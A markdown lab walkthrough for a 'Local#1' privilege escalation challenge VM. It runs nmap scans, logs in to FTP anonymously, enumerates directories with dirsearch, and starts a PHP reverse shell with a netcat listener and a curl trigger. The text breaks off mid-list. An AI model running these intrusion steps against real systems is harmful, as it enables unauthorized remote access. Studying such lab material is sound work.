# Project: Privilege Escalation Challenge (Local#1)

## 1. Preparation and Reconnnaissance
- IP Discovery:
    1. Run ```ifconfig``` in terminal to find your own IP.
        - Look for eth0 or en0, etc.
        - This is your Kali Linux VM's ip machine.
            <details>
            <summary>Click for Example</summary>
            
            ``` 
            bridge100: flags=8a63<UP,BROADCAST,SMART,        RUNNING,ALLMULTI,SIMPLEX,MULTICAST> mtu 1500
                options=3<RXCSUM,TXCSUM>
                ether 06:9d:05:11:76:64
                inet 192.168.128.1 netmask 0xffffff00 broadcast 192.168.128.255
                inet6 fe80::49d:5ff:fe11:7664%bridge100 prefixlen 64 scopeid 0x15 
                inet6 fd88:7a16:1d1e:c1ca:186a:5e34:e358:d3f prefixlen 64 autoconf secured 
                Configuration:
                    id 0:0:0:0:0:0 priority 0 hellotime 0 fwddelay 0
                    maxage 0 holdcnt 0 proto stp maxaddr 100 timeout 1200
                    root id 0:0:0:0:0:0 priority 0 ifcost 0 port 0
                    ipfilter disabled flags 0x0
                member: vmenet0 flags=3<LEARNING,DISCOVER>
                        ifmaxaddr 0 port 20 priority 0 path cost 0
                member: vmenet1 flags=3<LEARNING,DISCOVER>
                        ifmaxaddr 0 port 22 priority 0 path cost 0
                nd6 options=201<PERFORMNUD,DAD>
                media: autoselect
                status: active
                vmenet1: flags=8963<UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX,MULTICAST> mtu 1500
                    ether 1a:92:b2:d4:a2:da
                    media: autoselect
                    status: active
            ```
    </details>

    2.  We will now sweep our subnet to detect and extract the Target's IP information. <br>
    Run this command: ```nmap -sn <ip>/24 -n```
        * A list of ip will come up. 
        * Exclude your ip from previous step and you will have your target IP.  If there are multiple, do a port scan on the remaining IPs.
    <br>
    
        Run this command: ```sudo nmap -sV -sC -p- <ip>``` or ```-sV -sC -F <ip>```
            <details>
            <summary>Click to expand</summary>
            ```-sV```: Service Version Detection(e.g., "OpenSSH 8.2, Ubuntu x.x) <br>
            ```-sC```: A framework NSE script (Nmap Scripting Engine);
            <br> For more info: nmap --script-help default<br>
            ```-p-```: Scanning all 65k ports <br>
            ```-F```: Top 100 ports
            </details>

    3. You will see a list of information.  If it points to the Desktop, that is not the IP you want to use.  Look for another with PORT informations.

        Once you see a list of ports, it is time to "aggresive" scan the ports to see possible exploit spots.  This is part of the reconnnaissance.
        You can also run this command: ```nmap -sV -n <ip>```  or  ``` nmap -A -p 21,22,80 192.168.128.3 -Pn -n``` <br> 

        <details>
            <summary>Click for Command Explanation </summary>

            -A Agressive Scan
            -p port
            -Pn no ping
            -n: (disables DNS lookups)
            
        </details>



        <details>
        <summary>Click to example</summary>

            user.one@user escalator % nmap -sV -sC -F <ip>
            Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-20 16:24 +0200
            Nmap scan report for 192.168.128.2
            Host is up (0.0015s latency).
            Not shown: 97 filtered tcp ports (no-response)
            PORT   STATE SERVICE VERSION
            21/tcp open  ftp     ProFTPD
            | ftp-anon: Anonymous FTP login allowed (FTP code 230)
            | -rw-r--r--   1 0        0              87 Oct 21  2022 life.c
            |_-rw-r--r--   1 0        0             321 Oct 21  2022 template.html
            22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
            | ssh-hostkey: 
            |   2048 2f:c6:2f:c4:6d:a6:f5:5b:c2:1b:f9:17:1f:9a:09:89 (RSA)
            |   256 5e:91:1b:6b:f1:d8:81:de:8b:2c:f3:70:61:ea:6f:29 (ECDSA)
            |_  256 f1:98:21:91:c8:ee:4d:a2:83:14:64:96:37:5b:44:3d (ED25519)
            80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
            |_http-server-header: Apache/2.4.18 (Ubuntu)
            |_http-title: Local#1
            Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

            Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
            Nmap done: 1 IP address (1 host up) scanned in 18.17 seconds
        </details>
        
    4. There are a multiple way to to access this Virtual Machine as above example has shown.  We will be choosing the FTP route. 

        #### What is FTP?

        FTP (File Transfer Protocol) is a standard network protocol for transferring files between computers over TCP/IP networks like the internet. It uses separate control and data channels to upload, download, or manage files on remote servers.
        

        As you can see, it uses TCP/IP network.  Taking advantage of the separate control and its data channels, the logic is that if we can download from the source, we can also upload the source.  We will attempt this thought process.

        Run this command in the terminal:
        ```ftp <ip>```

        When it asks for login, if you look at above example, you will find this line ```ftp-anon: Anonymous FTP login allowed (FTP code 230)```<br>
        ```
        Login: anonymous 
        Password: None (Hit Enter)
        ```

        We are taking advantage of this vulnerability now.
        We are now in their server, lets see if we can download the files now.

        <details>
            <summary>Click for Command Explanation </summary>

            user.one@user escalator % ftp 192.168.128.2
            Connected to 192.168.128.2.
            220 ProFTPD Server (ProFTPD Default Installation) [192.168.128.2]
            Name (192.168.128.2:joon.kim): anonymous
            331 Anonymous login ok, send your complete email address as your password
            Password: 
            230 Anonymous access granted, restrictions apply
            Remote system type is UNIX.
            Using binary mode to transfer files.
            ftp> 
        </details>

        Type ```ls ``` to see what files there is to download.
        Use terminal command ```get <filename>``` to download. 

    5. Once you have successfully downloaded the files in the directory. Let us see what these files are by using the ```cat``` command-line
        ```
        cat <filename>
        ```

    Vulnerability Found!  <br>
    This is where normally, you would stop and notify the authorities and people of interest.  However for the exercise's objective, we will continue.

--- 

## 2. Initial Access 

We have found an access point.  From here on, we shall dig deeper and complete the task.

What we know at the point in time:
    - Ports that are in use: 21 (FTP), 22 (SSH), 80 (TCP)
    - 2 files are located in the FTP. (life.c, template.html)

We will now be using a tool called dirsearch (Directory Search) to "visibly" see. <br>
In the browser, go to the url: ```http://<ip>```

You will see that template.html is shown on the landing page. 
We will now check for the visual confirmation.
Open new terminal and type in this command in the terminal: <br>
```dirsearch -u http://TARGET/```

You are looking for response 200.
After the search comes back, check for 200.
Use that path and place it at the end of the URL.

Here is the visual confirmation we needed.

We were able to downloa the files using the FTP Access.  This tells us that if we can download from this access, it is also possible to upload.

So we will be using a technique called "Reverse Shell". <br>
A reverse shell is a hacking technique where the target machine (like the VM) reaches out to your Kali machine over the network, opening a direct command line you control remotely.

We will be using a tool called php-reverse-shell.
You can find it here on [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

We will be needing to do two setups for this.

* Setting up the php reverse shell file
* Setting up a netcat listener

What is a netcat?
Netcat (nc) is a simple, powerful command-line networking tool—"Swiss Army knife for TCP/UDP"—that reads/writes data across network connections for port scanning, file transfer, or creating shells


1. PHP-REVERSE-SHELL.PHP
    * Look for the line where it asks for IP and Listener.
    * Change the IP to MY IP we have been using.
    * Change the Listener to a port of your choice. 

    This is where we will be using 2-3 Terminal.

    Terminal 1:
    We will be using netcat to listen now.
    Run this command:  nc -lvnp [port] 

    <detail> 
        <summary> Click for Command </summary>
        
        -l listen mode, waiting incoming connections
        -v verbose output see detailed information in your terminal
        -n skip DNS lookup
        -p specify port
        
    </detail>


    <br>
    Go to the browser to check if the file has been uploaded.

    Once you have confirmed the file exists, we are going to use a curl command to "activate" this file.
    ```
    curl "http://<TARGET IP>/files/php-reverse-shell.php"
    ```
    Remember to put the URL in a string. Very Important! 

2. 